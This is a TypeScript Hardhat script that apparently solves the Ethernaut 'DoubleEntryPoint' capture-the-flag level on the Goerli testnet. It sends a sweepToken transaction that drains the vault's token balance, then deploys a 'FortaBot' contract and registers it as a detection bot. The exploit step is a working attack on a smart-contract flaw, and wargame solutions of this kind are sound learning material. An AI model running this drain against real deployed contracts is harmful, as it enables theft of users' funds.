import { Wallet } from "ethers";
import { ethers } from "hardhat";

const attackDoubleEntry = async () => {
    // change contract addresses here.
    const doubleEntryAddress = "0xadAcB58E871e29B6d9e70500a75aFf9b4bF9B1f7"; //type "await contract.address()" in ethernaut console
    const player = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954"; //place your player address here (you may type player in ethernaut console)
    const args: any[] = [];
    const deployer = process.env.PRIVATE_KEY || "";
    // [deployer] = await ethers.getSigners();

    // Don't touch below 🚀
    // Vulnerability from
    // Read more:
    // https://docs.soliditylang.org/en/latest/abi-spec.html#contract-abi-specification

    // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
    const ABI = [
        {
            inputs: [],
            name: "cryptoVault",
            outputs: [{ internalType: "address", name: "", type: "address" }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [{ internalType: "address", name: "account", type: "address" }],
            name: "balanceOf",
            outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [],
            name: "delegatedFrom",
            outputs: [{ internalType: "address", name: "", type: "address" }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [],
            name: "forta",
            outputs: [{ internalType: "contract Forta", name: "", type: "address" }],
            stateMutability: "nonpayable",
            type: "function",
        },
    ];

    // wallet and contract here
    const contract = await ethers.getContractAt(ABI, doubleEntryAddress);
    // using my custom rpc stored in .env (for privacy)
    const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL;
    const provider = new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
    const PRIVATE_KEY =
        process.env.PRIVATE_KEY || ""; /*Private Keys in .env file or hardcode here*/
    const wallet = new Wallet(PRIVATE_KEY, provider);

    const _cryptoVault = await contract.cryptoVault();
    console.log("cryptoVault address: ", _cryptoVault);

    // Check initial balance (100 DET)
    let vaultBalance = await contract.balanceOf(_cryptoVault).toString(); // '100000000000000000000'
    console.log("Balance of vault is: ", vaultBalance);

    const legacyToken = await contract.delegatedFrom();
    console.log("delegatedFrom address:", legacyToken);

    // etherjs
    console.log("Encoding function signature for sweepToken...");
    const iface = new ethers.utils.Interface(["function sweepToken(address token)"]);
    const sweepSig = iface.encodeFunctionData("sweepToken", [legacyToken]);

    // Send exploit transaction
    console.log("Sending transaction...");
    const tx1 = await wallet.sendTransaction({ from: player, to: _cryptoVault, data: sweepSig });
    console.log(tx1);

    // Check balance (0 DET)
    vaultBalance = await contract.balanceOf(_cryptoVault).toString(); // '0'
    console.log("Balance of vault is now: ", vaultBalance);

    // deploying fortabot here
    // const deployed = await deployContract(hre, "FortaBot", args);
    // alternative below
    console.log("Deploying attack contract FortaBot...");
    const Factory = await ethers.getContractFactory("FortaBot", deployer);
    const fortaBot = await Factory.deploy(_cryptoVault);
    console.log(fortaBot);
    console.log(`Contract deployed to ${fortaBot.address}`);
    console.log("Attack contract deployed...");
    // experimantal verify below
    // if (fortaBot.address){
    //     console.log("Verifying contract...");
    //     try {
    //         await run("verify:verify", {
    //             address: fortaBot.address,
    //             constructorArguments: args,
    //         });
    //     } catch (e: any) {
    //         if (e.message.toLowerCase().includes("already verified")) {
    //             console.log("Already verified!");
    //         } else {
    //             console.log(e);
    //         }
    //     }
    // }

    // FortaDetectionBot
    const botAddr = fortaBot.address;
    console.log("FortaBot address is: ", botAddr);

    // Forta contract address
    const forta = await contract.forta();
    console.log("Forta address is: ", forta);

    // etherjs
    console.log("Encoding function signature for setDetectionBot...");
    const ifaceBot = new ethers.utils.Interface([
        "function setDetectionBot(address detectionBotAddress)",
    ]);
    const setBotSig = ifaceBot.encodeFunctionData("setDetectionBot", [botAddr]);

    // Send the transaction setting the bot
    console.log("Sending transaction...");
    const tx2 = await wallet.sendTransaction({ from: player, to: forta, data: setBotSig });
    console.log(tx2);
    //TODO: verify success
    console.log("Done...Please submit to ethernaut.");
};

attackDoubleEntry()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
